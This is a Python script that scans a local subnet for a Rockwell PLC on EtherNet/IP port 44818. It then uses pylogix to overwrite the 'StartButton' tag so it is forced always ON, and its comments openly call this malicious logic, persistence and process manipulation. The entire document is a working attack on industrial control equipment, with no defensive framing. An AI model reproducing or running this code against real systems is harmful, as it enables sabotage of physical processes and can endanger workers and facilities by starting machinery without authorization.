import socket
from pylogix import PLC

def find_plc_ip():
    """
    Discover PLC IP address via network scanning.
    """
    ip_range = "192.168.1."  # Adjust this based on your network
    port = 44818  # Common Rockwell Protocol Port (EtherNet/IP)

    for i in range(1, 255):
        ip = f"{ip_range}{i}"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.2)  # Adjust timeout for efficiency

        try:
            sock.connect((ip, port))
            print(f"Found PLC at: {ip}")
            sock.close()
            return ip
        except (socket.timeout, ConnectionRefusedError):
            pass

    print("No PLC detected on the network.")
    return None

def modify_plc_program(plc_ip):
    """
    Modify an existing program on a Rockwell Micro850 PLC
    by modifying a variable (tag) or uploading malicious logic.
    """
    plc = PLC()
    plc.IPAddress = plc_ip

    # Example: Modify a logic variable (tag) for persistence
    tag_name = "StartButton"
    new_value = 1  # Force the tag to always be "ON" (manipulating process logic)

    try:
        response = plc.Write(tag_name, new_value)
        if response.Status == 'Success':
            print(f"Successfully modified {tag_name} on {plc_ip}")
        else:
            print(f"Failed to modify {tag_name}: {response.Status}")

    except Exception as e:
        print(f"Error modifying PLC program: {str(e)}")

    finally:
        plc.Close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        modify_plc_program(plc_ip)
    else:
        print("No accessible PLC found.")